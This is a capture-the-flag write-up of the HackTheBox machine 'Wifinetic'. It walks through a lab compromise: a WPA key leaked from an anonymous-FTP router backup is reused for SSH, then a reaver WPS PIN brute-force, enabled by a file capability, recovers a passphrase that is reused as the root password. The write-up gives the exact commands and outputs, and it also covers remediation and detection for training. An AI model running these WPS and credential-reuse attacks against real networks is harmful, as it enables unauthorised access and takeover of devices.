---
layout: default
title: "HackTheBox - Wifinetic"
---

# HackTheBox - Wifinetic

**OS:** Linux

Wifinetic is a Linux box built around a software-simulated WiFi environment (`mac80211_hwsim` — virtual radios, no physical hardware) configured like an OpenWrt router. Anonymous FTP exposes a router config backup whose wireless config leaks a WPA passphrase in cleartext; that passphrase is reused as a Linux SSH password. Privilege escalation is the interesting part: an unprivileged user can run `reaver` (granted `cap_net_raw`) to launch a WPS PIN attack against the box's *own* virtual access point, recovering the live WPA passphrase - which is in turn reused as the root password.

| Field | Value |
|---|---|
| Platform | HTB |
| Difficulty | Easy |
| Target | `<target-ip>` |
| Initial Access | WPA passphrase leaked in anonymous-FTP config backup, reused for SSH |
| Privilege Escalation | WPS PIN attack via `cap_net_raw` on `reaver`; recovered PSK reused as root password |
| Final Access | root |

---

## Attack Path

1. Recon finds anonymous FTP exposing an OpenWrt configuration backup.
2. The backup's wireless config leaks a WPA passphrase in cleartext, reused as the `netadmin` SSH password — foothold.
3. Local enumeration finds `cap_net_raw` on `reaver` plus a ready-made monitor interface and a WPS-enabled virtual AP.
4. A WPS PIN attack recovers the *live* WPA passphrase, which is reused as the root password — root.

The whole box is a credential-reuse chain with a wireless twist: two distinct reuse mistakes (backup PSK → SSH, live PSK → root) bookend a textbook WPS attack.

---

## Recon

```
nmap -sC -sV -T4 --open <target-ip>
```

| Port | Service | Notes |
|------|---------|-------|
| 21/tcp | vsftpd 3.0.3 | **Anonymous login allowed** |
| 22/tcp | OpenSSH 8.2p1 (Ubuntu) | |
| 53/tcp | tcpwrapped (DNS) | dnsmasq, not directly useful |

Anonymous FTP is the entry point. It exposes a set of migration documents and, critically, a router configuration backup:

```
MigrateOpenWrt.txt              migration plan (contains a hint)
ProjectGreatMigration.pdf
ProjectOpenWRT.pdf
backup-OpenWrt-2023-07-26.tar   <-- the prize
employees_wellness.pdf
```

> **Tradecraft note:** `vsftpd 3.0.3` is *not* the backdoored 2.3.4 — version alone is a dead end. The win here is *content* (anonymous read of a config backup), not a service CVE. Always enumerate what anonymous FTP actually exposes before reaching for an exploit.

---

## Initial Access

Mirror and unpack the backup:

```bash
wget -m --no-passive ftp://anonymous:anonymous@<target-ip>/
tar -xf backup-OpenWrt-2023-07-26.tar -C owrt
```

It is a standard OpenWrt `/etc` config tree. Two files matter.

`etc/passwd` reveals a non-default human account:

```
netadmin:x:999:999::/home/netadmin:/bin/false
```

`etc/config/wireless` leaks the WiFi key in cleartext:

```
config wifi-iface 'wifinet0'
    option ssid 'OpenWrt'
    option encryption 'psk'
    option key '<wifi-psk-from-backup>'
    option wps_pushbutton '1'        <-- WPS enabled; remember this for root
```

The leaked WiFi PSK is reused as `netadmin`'s SSH password:

```bash
ssh netadmin@<target-ip>      # password: the WPA key from etc/config/wireless
```

```
uid=1000(netadmin) gid=1000(netadmin) groups=1000(netadmin)
```

User proof captured.

> **Note:** `/etc/passwd` in the *backup* shows uid 999 / shell `/bin/false`, but the live Ubuntu host runs `netadmin` as uid 1000 with a real shell. The backup is a different (OpenWrt) system — it is an intel artifact, not a mirror of the target. Read recovered configs for *information*, not as ground truth about the live host.

---

## Privilege Escalation

### Enumeration that points the way

```bash
sudo -n -l            # password required — no sudo path
getcap -r / 2>/dev/null
```

The capability listing is the key:

```
/usr/bin/reaver = cap_net_raw+ep
```

`reaver` (a WPS attack tool) carries `cap_net_raw`, so **netadmin can mount a raw 802.11 WPS attack without root**. The wireless stack is already set up:

```bash
iw dev
```

```
phy#2  Interface mon0    type monitor          <-- monitor iface, ready to use
phy#0  Interface wlan0   type AP   ssid OpenWrt channel 1   (BSSID 02:00:00:00:00:00)
```

So we have everything the attack needs: a WPS-enabled AP (`wps_pushbutton '1'` from the backup), a monitor interface, and a capability-blessed `reaver`. `MigrateOpenWrt.txt` even spells out the intended technique:

```
- Test for security issues with Reaver tool
```

### Why WPS is attackable

WPS (WiFi Protected Setup) lets a client join using an **8-digit PIN** instead of the WPA passphrase. The flaw: the PIN is validated in two halves and the 8th digit is only a checksum, so the keyspace collapses from 10^8 to **10^4 + 10^3 ≈ 11,000** guesses. Once the correct PIN is found, the AP returns the **plaintext WPA PSK** in the WPS M7 message. PIN brute-force is the classic Reaver attack.

### Running the attack

First try Pixie-Dust (offline, instant) — it fails here, because the simulated AP does not leak exploitable nonce/entropy:

```bash
reaver -i mon0 -b 02:00:00:00:00:00 -c 1 -vv -K 1
#  Pixiewps 1.4 ... [-] WPS pin not found!
```

Fall back to the **online PIN brute-force**:

```bash
reaver -i mon0 -b 02:00:00:00:00:00 -c 1 -vv -L -N -d 2 -T .5
```

The first PIN tried (`12345670`, Reaver's built-in default) is accepted — the full WPS M1→M7 exchange completes and the PSK is disclosed:

```
[+] Received M7 message
[+] Pin cracked in 14 seconds
[+] WPS PIN: '12345670'
[+] WPA PSK: '<recovered-live-psk>'
[+] AP SSID: 'OpenWrt'
```

Reaver flags used:

- `-K 1` Pixie-Dust attempt (first run only)
- `-L` ignore "locked" WPS state
- `-N` don't send NACK on failures (keeps the simulated AP responsive)
- `-d 2 -T .5` pacing (delay / receive timeout) to stay in sync with hwsim

### Root via the recovered PSK

The recovered **live** PSK differs from the stale key in the backup — and it is reused as the root password:

```bash
ssh netadmin@<target-ip>
su -                          # password: the PSK recovered by reaver
id    # uid=0(root) groups=0(root)
```

Root proof captured.

---

## Summary

Wifinetic chains two credential-reuse mistakes around a wireless attack. A config backup readable over anonymous FTP leaks a WPA passphrase reused for SSH; then a single Linux capability (`cap_net_raw` on `reaver`) lets an unprivileged user run a WPS PIN attack against the box's own simulated AP, recovering the live WPA passphrase, which is reused as the root password.

**Key takeaway:** WPS turns even a strong WPA passphrase into an ~11,000-guess problem *and discloses the passphrase in cleartext* once the PIN is cracked. And a single capability on a network tool can be a full privilege-escalation bridge — capabilities don't show up in a SUID hunt.

---

## Root Cause

- **Sensitive config exposed anonymously.** A full router configuration backup, including a cleartext WPA key, was readable by anonymous FTP.
- **WPS left enabled.** WPS PIN authentication reduces the WPA keyspace to ~11k and returns the PSK in cleartext on success.
- **Over-broad capability.** `cap_net_raw+ep` on `reaver` let an unprivileged user perform a raw 802.11 attack normally requiring root.
- **Credential reuse, twice.** Backup PSK → SSH, and live PSK → root. Each reused secret collapsed a trust boundary.

## Impact

Successful exploitation reached root. From an anonymous, read-only FTP service an attacker obtained an interactive foothold and then full administrative control of the host — enabling command execution, sensitive-file and proof access, credential collection, and a realistic path to adjacent systems wherever the same passphrases are reused.

## Remediation

- Remove sensitive material from anonymously accessible shares; restrict or disable anonymous FTP and audit what it serves.
- **Disable WPS** on access points — there is no safe configuration of WPS PIN; it is the canonical remediation.
- Strip unnecessary file capabilities (`setcap -r /usr/bin/reaver`); grant `cap_net_raw` only to processes that genuinely require it, ideally via a dedicated service account.
- Use unique secrets per system and per service; rotate any WPA passphrase exposed in a backup and search for reuse across SSH/root/other accounts.

## Detection Opportunities

- Alert on anonymous FTP authentication and on retrieval of configuration/backup artifacts (`*.tar`, `backup-*`).
- Monitor for WPS brute-force on real infrastructure: bursts of EAPOL/WPS M1–M7 exchanges and repeated PIN attempts from one station.
- Inventory file capabilities (`getcap -r /`) as part of host baselining; alert on capabilities appearing on network/attack tooling.
- Correlate a successful SSH login followed quickly by `su` to root using the same or a related secret — a credential-reuse signature.

## Lessons Learned

- **WPS is a standing weakness.** Even with a strong WPA passphrase, an enabled WPS PIN reduces the effective keyspace to ~11k guesses and *discloses the passphrase in cleartext* once cracked. Reaver/Pixiewps are the standard tooling; real-world remediation is to disable WPS entirely.
- **Linux capabilities are a privesc surface.** `cap_net_raw+ep` on `reaver` was the intended bridge — a single capability on a network tool let an unprivileged user mount an L2 wireless attack. Audit `getcap -r /` on every box; capabilities are easy to miss because they don't appear in a SUID hunt.
- **Credential reuse compounds.** Two reuse mistakes chained — backup PSK → SSH and live PSK → root — turned read-only FTP into full compromise. Treat every recovered secret as a candidate password for every other service and account.
- **`mac80211_hwsim`** simulates a full WiFi radio stack in software, so WPS/WPA attacks are reproducible in a lab with zero hardware — useful for practicing wireless tradecraft (airmon-ng, reaver, aircrack) without a physical adapter.

---

## Appendix: Tools Used

| Tool | Contribution |
|------|--------------|
| `nmap` | Service/version + `ftp-anon` discovery |
| `wget` | Mirror anonymous FTP |
| `tar` | Unpack OpenWrt config backup |
| `iw` / `getcap` | Found monitor interface + `cap_net_raw` on `reaver` |
| `reaver` / `pixiewps` | WPS PIN brute-force → WPA PSK disclosure |
| `ssh` / `su` | Foothold and root via credential reuse |

> **Public-safe note:** target IP, proof values, and the literal WPA passphrases are redacted. The WPS PIN shown (`12345670`) is Reaver's documented default and is retained because it is part of the lesson, not a target secret.
